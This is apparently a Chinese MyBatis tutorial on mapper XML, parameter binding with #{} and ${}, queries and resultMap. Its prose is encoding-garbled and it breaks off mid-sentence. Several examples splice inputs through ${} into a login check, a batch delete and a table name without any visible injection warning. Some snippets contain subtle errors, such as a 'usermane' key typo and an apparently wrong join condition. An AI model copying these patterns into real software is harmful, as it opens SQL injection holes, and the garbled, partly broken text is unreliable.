13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE mapper PUBLIC \u0026#34;-//mybatis.org//DTD Mapper 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd\u0026#34;\u0026gt; \u0026lt;mapper namespace=\u0026#34;com.reus.mybatis.mapper.UserMapper\u0026#34;\u0026gt; \u0026lt;!--int insertUser();--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34;\u0026gt; insert into t_user values(null,\u0026#39;å¼ ä¸‰\u0026#39;,\u0026#39;123\u0026#39;,23,\u0026#39;å¥³\u0026#39;,\u0026#39;123@qq.com\u0026#39;) \u0026lt;/insert\u0026gt; \u0026lt;!--updateUser--\u0026gt; \u0026lt;update id=\u0026#34;updateUser\u0026#34;\u0026gt; update t_user set username = \u0026#39;æå››\u0026#39; where id = 4 \u0026lt;/update\u0026gt; \u0026lt;!--void deleteUser();--\u0026gt; \u0026lt;delete id=\u0026#34;deleteUser\u0026#34;\u0026gt; delete from t_user where id = 4 \u0026lt;/delete\u0026gt; \u0026lt;!--User getUserById(); å¿…é¡»è®¾ç½®å¯¹åº”çš„æ ‡ç­¾ resultType å’Œ resultMap resultType : è®¾ç½®é»˜è®¤çš„æ˜ å°„å…³ç³» resultMap: è®¾ç½®è‡ªå®šä¹‰çš„æ˜ å°„å…³ç³» --\u0026gt; \u0026lt;select id=\u0026#34;getUserById\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where id = 3 \u0026lt;/select\u0026gt; \u0026lt;!--List\u0026lt;User\u0026gt; getAllUser(); --\u0026gt; \u0026lt;select id=\u0026#34;getAllUser\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user; \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; è·å–é…ç½®ä¸­çš„ä¿¡æ¯\nè¿ç”¨SqlsessionFactory 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class UserMapperTest { @Test public void testInsertUser() throws IOException { //è¯»å–MyBatisçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ InputStream is = Resources.getResourceAsStream(\u0026#34;mybatis-config.xml\u0026#34;); //è·å–SqlSessionFactoryBuilderå¯¹è±¡ SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder(); //é€šè¿‡æ ¸å¿ƒé…ç½®æ–‡ä»¶æ‰€å¯¹åº”çš„å­—èŠ‚è¾“å…¥æµåˆ›å»ºå·¥å‚ç±»SqlSessionFactoryï¼Œç”Ÿäº§SqlSessionå¯¹è±¡ SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is); //è·å–sqlSessionï¼Œæ­¤æ—¶é€šè¿‡SqlSessionå¯¹è±¡æ‰€æ“ä½œçš„sqléƒ½å¿…é¡»æ‰‹åŠ¨æäº¤æˆ–å›æ»šäº‹åŠ¡ //SqlSession sqlSession = sqlSessionFactory.openSession(); //åˆ›å»ºSqlSessionå¯¹è±¡ï¼Œæ­¤æ—¶é€šè¿‡SqlSessionå¯¹è±¡æ‰€æ“ä½œçš„sqléƒ½ä¼šè‡ªåŠ¨æäº¤ SqlSession sqlSession = sqlSessionFactory.openSession(true); //é€šè¿‡ä»£ç†æ¨¡å¼åˆ›å»ºUserMapperæ¥å£çš„ä»£ç†å®ç°ç±»å¯¹è±¡ UserMapper userMapper = sqlSession.getMapper(UserMapper.class); //è°ƒç”¨UserMapperæ¥å£ä¸­çš„æ–¹æ³•ï¼Œå°±å¯ä»¥æ ¹æ®UserMapperçš„å…¨ç±»ååŒ¹é…å…ƒç´ æ–‡ä»¶ï¼Œé€šè¿‡è°ƒç”¨çš„æ–¹æ³•ååŒ¹é…æ˜ å°„æ–‡ä»¶ä¸­çš„SQLæ ‡ç­¾ï¼Œå¹¶æ‰§è¡Œæ ‡ç­¾ä¸­çš„SQLè¯­å¥ int result = userMapper.insertUser(); //æäº¤äº‹åŠ¡ //sqlSession.commit(); System.out.println(\u0026#34;result:\u0026#34; + result); } } 3 è·å–å‚æ•° MyBatisè·å–å‚æ•°å€¼çš„ä¸¤ç§æ–¹å¼ï¼š${}å’Œ#{} ${}çš„æœ¬è´¨å°±æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œ#{}çš„æœ¬è´¨å°±æ˜¯å ä½ç¬¦èµ‹å€¼ ${}ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼æ‹¼æ¥sqlï¼Œè‹¥ä¸ºå­—ç¬¦ä¸²ç±»å‹æˆ–æ—¥æœŸç±»å‹çš„å­—æ®µè¿›è¡Œèµ‹å€¼æ—¶ï¼Œéœ€è¦æ‰‹åŠ¨åŠ å•å¼•å·ï¼›ä½†æ˜¯#{}ä½¿ç”¨å ä½ç¬¦èµ‹å€¼çš„æ–¹å¼æ‹¼æ¥sqlï¼Œæ­¤æ—¶ä¸ºå­—ç¬¦ä¸²ç±»å‹æˆ–æ—¥æœŸç±»å‹çš„å­—æ®µè¿›è¡Œèµ‹å€¼æ—¶ï¼Œå¯ä»¥è‡ªåŠ¨æ·»åŠ å•å¼•å· 3.1 å•ä¸ªå­—é¢é‡ç±»å‹æ•°æ® å•ä¸ªå­—é¢é‡ç±»å‹æ•°æ®\nè‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ä¸ºå•ä¸ªçš„å­—é¢é‡ç±»å‹ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨${}å’Œ#{}ä»¥ä»»æ„çš„åç§°ï¼ˆæœ€å¥½è§åè¯†æ„ï¼‰è·å–å‚æ•°çš„å€¼ï¼Œæ³¨æ„${}éœ€è¦æ‰‹åŠ¨åŠ å•å¼•å· 1 2 3 4 5 6 7 8 9 \u0026lt;!--User getUserByUsername(String username);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByUsername\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} \u0026lt;/select\u0026gt; \u0026lt;!--User getUserByUsername(String username);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByUsername\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = \u0026#39;${username}\u0026#39; \u0026lt;/select\u0026gt; 3.2 å¤šä¸ªä¸ªå­—é¢é‡ç±»å‹æ•°æ® å¤šä¸ªå­—é¢é‡ç±»å‹çš„å‚æ•°\nè‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ä¸ºå¤šä¸ªæ—¶ï¼Œæ­¤æ—¶MyBatisä¼šè‡ªåŠ¨å°†è¿™äº›å‚æ•°æ”¾åœ¨ä¸€ä¸ªmapé›†åˆä¸­\n1 2 1. ä»¥arg0,arg1...ä¸ºé”®ï¼Œä»¥å‚æ•°ä¸ºå€¼ï¼› 2. ä»¥param1,param2...ä¸ºé”®ï¼Œä»¥å‚æ•°ä¸ºå€¼ï¼› å› æ­¤åªéœ€è¦é€šè¿‡\\${}å’Œ#{}è®¿é—®mapé›†åˆçš„é”®å°±å¯ä»¥è·å–ç›¸å¯¹åº”çš„å€¼ï¼Œæ³¨æ„${}éœ€è¦æ‰‹åŠ¨åŠ å•å¼•å·ã€‚\nä½¿ç”¨argæˆ–è€…paraméƒ½è¡Œï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œargæ˜¯ä»arg0å¼€å§‹çš„ï¼Œparamæ˜¯ä»param1å¼€å§‹çš„\n1 2 3 4 5 6 7 8 9 \u0026lt;!--User checkLogin(String username,String password);--\u0026gt; \u0026lt;select id=\u0026#34;checkLogin\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{arg0} and password = #{arg1} \u0026lt;/select\u0026gt; \u0026lt;!--User checkLogin(String username,String password);--\u0026gt; \u0026lt;select id=\u0026#34;checkLogin\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = \u0026#39;${param1}\u0026#39; and password = \u0026#39;${param2}\u0026#39; \u0026lt;/select\u0026gt; 3.3 mapé›†åˆç±»å‹çš„å‚æ•° è‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•éœ€è¦çš„å‚æ•°ä¸ºå¤šä¸ªæ—¶ï¼Œæ­¤æ—¶å¯ä»¥æ‰‹åŠ¨åˆ›å»ºmapé›†åˆï¼Œå°†è¿™äº›æ•°æ®æ”¾åœ¨mapä¸­åªéœ€è¦é€šè¿‡\\${}å’Œ#{}è®¿é—®mapé›†åˆçš„é”®å°±å¯ä»¥è·å–ç›¸å¯¹åº”çš„å€¼ï¼Œæ³¨æ„${}éœ€è¦æ‰‹åŠ¨åŠ å•å¼•å·\nå³æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªmapé›†åˆï¼Œä½œä¸ºå‚æ•°ä¼ é€’ç»™é…ç½®ï¼Œé…ç½®ä¸­å³å¯ä½¿ç”¨mapæ¥è·å–æ•°æ® 1 2 3 4 \u0026lt;!--User checkLoginByMap(Map\u0026lt;String,Object\u0026gt; map);--\u0026gt; \u0026lt;select id=\u0026#34;checkLoginByMap\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} and password = #{password} \u0026lt;/select\u0026gt; 1 2 3 4 5 6 7 8 9 10 @Test public void checkLoginByMap() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); ParameterMapper mapper = sqlSession.getMapper(ParameterMapper.class); Map\u0026lt;String,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;usermane\u0026#34;,\u0026#34;admin\u0026#34;); map.put(\u0026#34;password\u0026#34;,\u0026#34;123456\u0026#34;); User user = mapper.checkLoginByMap(map); System.out.println(user); } 3.4 å®ä½“ç±»ç±»å‹çš„å‚æ•° è‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ä¸ºå®ä½“ç±»å¯¹è±¡æ—¶æ­¤æ—¶å¯ä»¥ä½¿ç”¨\\${}å’Œ#{}ï¼Œé€šè¿‡è®¿é—®å®ä½“ç±»å¯¹è±¡ä¸­çš„å±æ€§åè·å–å±æ€§å€¼ï¼Œæ³¨æ„${}éœ€è¦æ‰‹åŠ¨åŠ å•å¼•å·\nè¿™æ˜¯åº”ä¸ºä¸€ä¸ªç±»å‹ä¸­çš„å‚æ•°åç›¸å½“ä¸map ä¸­çš„key 1 2 3 4 \u0026lt;!--int insertUser(User user);--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34;\u0026gt; insert into t_user values(null,#{username},#{password},#{age},#{sex},#{email}) \u0026lt;/insert\u0026gt; 1 2 3 4 5 6 7 @Test public void insertUser() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); ParameterMapper mapper = sqlSession.getMapper(ParameterMapper.class); User user = new User(null,\u0026#34;Tom\u0026#34;,\u0026#34;123456\u0026#34;,12,\u0026#34;ç”·\u0026#34;,\u0026#34;123@321.com\u0026#34;); mapper.insertUser(user); } 3.5 ä½¿ç”¨@Paramæ ‡è¯†å‚æ•° å¯ä»¥é€šè¿‡@Paramæ³¨è§£æ ‡è¯†mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ï¼Œæ­¤æ—¶ï¼Œä¼šå°†è¿™äº›å‚æ•°æ”¾åœ¨mapé›†åˆä¸­\n1 2 3 4 \u0026lt;!--User CheckLoginByParam(@Param(\u0026#34;username\u0026#34;) String username, @Param(\u0026#34;password\u0026#34;) String password);--\u0026gt; \u0026lt;select id=\u0026#34;CheckLoginByParam\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} and password = #{password} \u0026lt;/select\u0026gt; 4 å„ç§æŸ¥è¯¢ å¦‚æœæŸ¥è¯¢å‡ºçš„æ•°æ®åªæœ‰ä¸€æ¡ï¼Œå¯ä»¥é€šè¿‡\nå®ä½“ç±»å¯¹è±¡æ¥æ”¶ Listé›†åˆæ¥æ”¶ Mapé›†åˆæ¥æ”¶ï¼Œç»“æœ{password=123456, sex=ç”·, id=1, age=23, username=admin} å¦‚æœæŸ¥è¯¢å‡ºçš„æ•°æ®æœ‰å¤šæ¡ï¼Œä¸€å®šä¸èƒ½ç”¨å®ä½“ç±»å¯¹è±¡æ¥æ”¶ï¼Œä¼šæŠ›å¼‚å¸¸TooManyResultsExceptionï¼Œå¯ä»¥é€šè¿‡\nå®ä½“ç±»ç±»å‹çš„LIsté›†åˆæ¥æ”¶ Mapç±»å‹çš„LIsté›†åˆæ¥æ”¶ åœ¨mapperæ¥å£çš„æ–¹æ³•ä¸Šæ·»åŠ @MapKeyæ³¨è§£ å› ä¸ºæŸ¥è¯¢æ•°æ®åªæœ‰ä¸€æ¡è¾ƒä¸ºç®€å•ï¼Œå°±ä¸åœ¨èµ˜è¿°ï¼Œè¿™é‡Œåªè®²ä¸€ä¸‹å¤šæ¡æ•°æ®çš„æƒ…å†µ\nå¤šæ¡æ•°æ®\næ³•ä¸€\næŸ¥è¯¢ç»“æœä¸ºä¸€ä¸ªmapçš„listé›†åˆ 1 2 3 4 5 6 /** * æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ä¸ºmapé›†åˆ * @return * å°†è¡¨ä¸­çš„æ•°æ®ä»¥mapé›†åˆçš„æ–¹å¼æŸ¥è¯¢ï¼Œä¸€æ¡æ•°æ®å¯¹åº”ä¸€ä¸ªmapï¼›è‹¥æœ‰å¤šæ¡æ•°æ®ï¼Œå°±ä¼šäº§ç”Ÿå¤šä¸ªmapé›†åˆï¼Œæ­¤æ—¶å¯ä»¥å°†è¿™äº›mapæ”¾åœ¨ä¸€ä¸ªlisté›†åˆä¸­è·å– */ List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; getAllUserToMap(); 1 2 3 4 5 6 7 8 9 10 \u0026lt;!--Map\u0026lt;String, Object\u0026gt; getAllUserToMap();--\u0026gt; \u0026lt;select id=\u0026#34;getAllUserToMap\u0026#34; resultType=\u0026#34;map\u0026#34;\u0026gt; select * from t_user \u0026lt;/select\u0026gt; \u0026lt;!-- ç»“æœï¼š [{password=123456, sex=ç”·, id=1, age=23, username=admin}, {password=123456, sex=ç”·, id=2, age=23, username=å¼ ä¸‰}, {password=123456, sex=ç”·, id=3, age=23, username=å¼ ä¸‰}] --\u0026gt; æ³•äºŒ\næ ¹æ®@MapKeyæŒ‡å®šä¸€ä¸ªä¸»é”® 1 2 3 4 5 6 7 /** * æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ä¸ºmapé›†åˆ * @return * å°†è¡¨ä¸­çš„æ•°æ®ä»¥mapé›†åˆçš„æ–¹å¼æŸ¥è¯¢ï¼Œä¸€æ¡æ•°æ®å¯¹åº”ä¸€ä¸ªmapï¼›è‹¥æœ‰å¤šæ¡æ•°æ®ï¼Œå°±ä¼šäº§ç”Ÿå¤šä¸ªmapé›†åˆï¼Œå¹¶ä¸”æœ€ç»ˆè¦ä»¥ä¸€ä¸ªmapçš„æ–¹å¼è¿”å›æ•°æ®ï¼Œæ­¤æ—¶éœ€è¦é€šè¿‡@MapKeyæ³¨è§£è®¾ç½®mapé›†åˆçš„é”®ï¼Œå€¼æ˜¯æ¯æ¡æ•°æ®æ‰€å¯¹åº”çš„mapé›†åˆ */ @MapKey(\u0026#34;id\u0026#34;) Map\u0026lt;String, Object\u0026gt; getAllUserToMap(); 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!--Map\u0026lt;String, Object\u0026gt; getAllUserToMap();--\u0026gt; \u0026lt;select id=\u0026#34;getAllUserToMap\u0026#34; resultType=\u0026#34;map\u0026#34;\u0026gt; select * from t_user \u0026lt;/select\u0026gt; \u0026lt;!-- ç»“æœï¼š { 1={password=123456, sex=ç”·, id=1, age=23, username=admin}, 2={password=123456, sex=ç”·, id=2, age=23, username=å¼ ä¸‰}, 3={password=123456, sex=ç”·, id=3, age=23, username=å¼ ä¸‰} } --\u0026gt; 5 ç‰¹æ®ŠSQLçš„æ‰§è¡Œ 5.1 æ¨¡ç³ŠæŸ¥è¯¢ 1 2 3 4 5 6 7 /** * æ ¹æ®ç”¨æˆ·åè¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢ * @param username * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.User\u0026gt; * @date 2022/2/26 21:56 */ List\u0026lt;User\u0026gt; getUserByLike(@Param(\u0026#34;username\u0026#34;) String username); 1 2 3 4 5 6 \u0026lt;!--List\u0026lt;User\u0026gt; getUserByLike(@Param(\u0026#34;username\u0026#34;) String username);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByLike\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; \u0026lt;!--select * from t_user where username like \u0026#39;%${mohu}%\u0026#39;--\u0026gt; \u0026lt;!--select * from t_user where username like concat(\u0026#39;%\u0026#39;,#{mohu},\u0026#39;%\u0026#39;)--\u0026gt; select * from t_user where username like \u0026#34;%\u0026#34;#{mohu}\u0026#34;%\u0026#34; \u0026lt;/select\u0026gt; å…¶ä¸­select * from t_user where username like \u0026quot;%\u0026quot;#{mohu}\u0026quot;%\u0026quot;æ˜¯æœ€å¸¸ç”¨çš„ 5.2 æ‰¹é‡åˆ é™¤ åªèƒ½ä½¿ç”¨${}ï¼Œå¦‚æœä½¿ç”¨#{}ï¼Œåˆ™è§£æåçš„sqlè¯­å¥ä¸ºdelete from t_user where id in ('1,2,3')ï¼Œè¿™æ ·æ˜¯å°†1,2,3çœ‹åšæ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œåªæœ‰idä¸º1,2,3çš„æ•°æ®ä¼šè¢«åˆ é™¤ã€‚æ­£ç¡®çš„è¯­å¥åº”è¯¥æ˜¯delete from t_user where id in (1,2,3)ï¼Œæˆ–è€…delete from t_user where id in ('1','2','3')\n1 2 3 4 5 6 7 /** * æ ¹æ®idæ‰¹é‡åˆ é™¤ * @param ids * @return int * @date 2022/2/26 22:06 */ int deleteMore(@Param(\u0026#34;ids\u0026#34;) String ids); 1 2 3 \u0026lt;delete id=\u0026#34;deleteMore\u0026#34;\u0026gt; delete from t_user where id in (${ids}) \u0026lt;/delete\u0026gt; 5.3 åŠ¨æ€è®¾ç½®è¡¨å åªèƒ½ä½¿ç”¨${}ï¼Œå› ä¸ºè¡¨åä¸èƒ½åŠ å•å¼•å·\n1 2 3 4 5 6 7 /** * æŸ¥è¯¢æŒ‡å®šè¡¨ä¸­çš„æ•°æ® * @param tableName * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.User\u0026gt; * @date 2022/2/27 14:41 */ List\u0026lt;User\u0026gt; getUserByTable(@Param(\u0026#34;tableName\u0026#34;) String tableName); 1 2 3 4 \u0026lt;!--List\u0026lt;User\u0026gt; getUserByTable(@Param(\u0026#34;tableName\u0026#34;) String tableName);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByTable\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from ${tableName} \u0026lt;/select\u0026gt; 5.4 æ·»åŠ åŠŸèƒ½è·å–è‡ªå¢çš„ä¸»é”® ä½¿ç”¨åœºæ™¯\nt_clazz(clazz_id,clazz_name)\nt_student(student_id,student_name,clazz_id) æ·»åŠ ç­çº§ä¿¡æ¯ è·å–æ–°æ·»åŠ çš„ç­çº§çš„id ä¸ºç­çº§åˆ†é…å­¦ç”Ÿï¼Œå³å°†æŸå­¦çš„ç­çº§idä¿®æ”¹ä¸ºæ–°æ·»åŠ çš„ç­çº§çš„id åœ¨mapper.xmlä¸­è®¾ç½®ä¸¤ä¸ªå±æ€§\nuseGeneratedKeysï¼šè®¾ç½®ä½¿ç”¨è‡ªå¢çš„ä¸»é”®\nkeyPropertyï¼šå› ä¸ºå¢åˆ æ”¹æœ‰ç»Ÿä¸€çš„è¿”å›å€¼æ˜¯å—å½±å“çš„è¡Œæ•°ï¼Œå› æ­¤åªèƒ½å°†è·å–çš„è‡ªå¢çš„ä¸»é”®æ”¾åœ¨ä¼ è¾“çš„å‚æ•°userå¯¹è±¡çš„æŸä¸ªå±æ€§ä¸­\n1 2 3 4 5 6 /** * æ·»åŠ ç”¨æˆ·ä¿¡æ¯ * @param user * @date 2022/2/27 15:04 */ void insertUser(User user); 1 2 3 4 \u0026lt;!--void insertUser(User user);--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34; useGeneratedKeys=\u0026#34;true\u0026#34; keyProperty=\u0026#34;id\u0026#34;\u0026gt; insert into t_user values (null,#{username},#{password},#{age},#{sex},#{email}) \u0026lt;/insert\u0026gt; 1 2 3 4 5 6 7 8 9 10 //æµ‹è¯•ç±» @Test public void insertUser() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); SQLMapper mapper = sqlSession.getMapper(SQLMapper.class); User user = new User(null, \u0026#34;ton\u0026#34;, \u0026#34;123\u0026#34;, 23, \u0026#34;ç”·\u0026#34;, \u0026#34;123@321.com\u0026#34;); mapper.insertUser(user); System.out.println(user); //è¾“å‡ºï¼šuser{id=10, username=\u0026#39;ton\u0026#39;, password=\u0026#39;123\u0026#39;, age=23, sex=\u0026#39;ç”·\u0026#39;, email=\u0026#39;123@321.com\u0026#39;}ï¼Œè‡ªå¢ä¸»é”®å­˜æ”¾åˆ°äº†userçš„idå±æ€§ä¸­ } å› ä¸ºå¦‚æœä¸è®¾ç½®useGeneratedKeys,æˆ‘ä»¬æ’å…¥ä¹‹åï¼Œå¾—åˆ°çš„è¿™ä¸ªuserå¯¹è±¡çš„idæ²¡æœ‰è®¾ç½®ï¼Œä»ä¸ºnullï¼Œå‡å¦‚å®ƒçš„ç›®çš„å³ä¸ºå°†æ•°æ®æ’å…¥åˆ°æ•°æ®åº“ä¸­å¾—åˆ°çš„idè¿”å›ç»™åç«¯çš„userå¯¹è±¡ï¼Œå¯¹å…¶èµ‹å€¼\n6 è‡ªå®šä¹‰æ˜ å°„resultMap resultMapï¼šè®¾ç½®è‡ªå®šä¹‰æ˜ å°„ å±æ€§ï¼š idï¼šè¡¨ç¤ºè‡ªå®šä¹‰æ˜ å°„çš„å”¯ä¸€æ ‡è¯†ï¼Œä¸èƒ½é‡å¤ typeï¼šæŸ¥è¯¢çš„æ•°æ®è¦æ˜ å°„çš„å®ä½“ç±»çš„ç±»å‹ å­æ ‡ç­¾ï¼š idï¼šè®¾ç½®ä¸»é”®çš„æ˜ å°„å…³ç³» resultï¼šè®¾ç½®æ™®é€šå­—æ®µçš„æ˜ å°„å…³ç³» å­æ ‡ç­¾å±æ€§ï¼š propertyï¼šè®¾ç½®æ˜ å°„å…³ç³»ä¸­å®ä½“ç±»ä¸­çš„å±æ€§å columnï¼šè®¾ç½®æ˜ å°„å…³ç³»ä¸­è¡¨ä¸­çš„å­—æ®µå 6.1 ä¸€å¯¹ä¸€æ˜ å°„ è‹¥å­—æ®µåå’Œå®ä½“ç±»ä¸­çš„å±æ€§åä¸ä¸€è‡´ï¼Œåˆ™å¯ä»¥é€šè¿‡resultMapè®¾ç½®è‡ªå®šä¹‰æ˜ å°„ï¼Œå³ä½¿å­—æ®µåå’Œå±æ€§åä¸€è‡´çš„å±æ€§ä¹Ÿè¦æ˜ å°„ï¼Œä¹Ÿå°±æ˜¯å…¨éƒ¨å±æ€§éƒ½è¦åˆ—å‡ºæ¥\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;resultMap id=\u0026#34;empResultMap\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--List\u0026lt;Emp\u0026gt; getAllEmp();--\u0026gt; \u0026lt;select id=\u0026#34;getAllEmp\u0026#34; resultMap=\u0026#34;empResultMap\u0026#34;\u0026gt; select * from t_emp \u0026lt;/select\u0026gt; è‹¥å­—æ®µåå’Œå®ä½“ç±»ä¸­çš„å±æ€§åä¸ä¸€è‡´ï¼Œä½†æ˜¯å­—æ®µåç¬¦åˆæ•°æ®åº“çš„è§„åˆ™ï¼ˆä½¿ç”¨_ï¼‰ï¼Œå®ä½“ç±»ä¸­çš„å±æ€§åç¬¦åˆJavaçš„è§„åˆ™ï¼ˆä½¿ç”¨é©¼å³°ï¼‰ã€‚æ­¤æ—¶ä¹Ÿå¯é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼å¤„ç†å­—æ®µåå’Œå®ä½“ç±»ä¸­çš„å±æ€§çš„æ˜ å°„å…³ç³»\nsqlè¯­å¥ä¸­å­—æ®µèµ·åˆ«å\n1 select eid,emp_name empName,age,sex,email from t_emp å¼€å¯mapUnderscoreToCamelCase\n1 2 3 \u0026lt;settings\u0026gt; \u0026lt;setting name=\u0026#34;mapUnderscoreToCamelCase\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; 6.2 å¤šå¯¹ä¸€æ˜ å°„ 1 2 3 4 5 6 7 8 9 public class Emp { private Integer eid; private String empName; private Integer age; private String sex; private String email; private Dept dept; //...æ„é€ å™¨ã€getã€setæ–¹æ³•ç­‰ } çº§è”æ–¹å¼å¤„ç†æ˜ å°„å…³ç³»\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;resultMap id=\u0026#34;empAndDeptResultMapOne\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;dept.did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;dept.deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDept(@Param(\u0026#34;eid\u0026#34;)Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDept\u0026#34; resultMap=\u0026#34;empAndDeptResultMapOne\u0026#34;\u0026gt; select * from t_emp left join t_dept on t_emp.eid = t_dept.did where t_emp.eid = #{eid} \u0026lt;/select\u0026gt; ä½¿ç”¨associationå¤„ç†æ˜ å°„å…³ç³»\nassociationï¼šå¤„ç†å¤šå¯¹ä¸€çš„æ˜ å°„å…³ç³» propertyï¼šéœ€è¦å¤„ç†å¤šå¯¹çš„æ˜ å°„å…³ç³»çš„å±æ€§å javaTypeï¼šè¯¥å±æ€§çš„ç±»å‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;resultMap id=\u0026#34;empAndDeptResultMapTwo\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;association property=\u0026#34;dept\u0026#34; javaType=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/association\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDept(@Param(\u0026#34;eid\u0026#34;)Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDept\u0026#34; resultMap=\u0026#34;empAndDeptResultMapTwo\u0026#34;\u0026gt; select * from t_emp left join t_dept on t_emp.eid = t_dept.did where t_emp.eid = #{eid} \u0026lt;/select\u0026gt; åˆ†å¸ƒæŸ¥è¯¢\nå…¶å®å°±æ˜¯å°†å¦ä¸€æ¡mapperå®ç°çš„sqlè¯­å¥æ 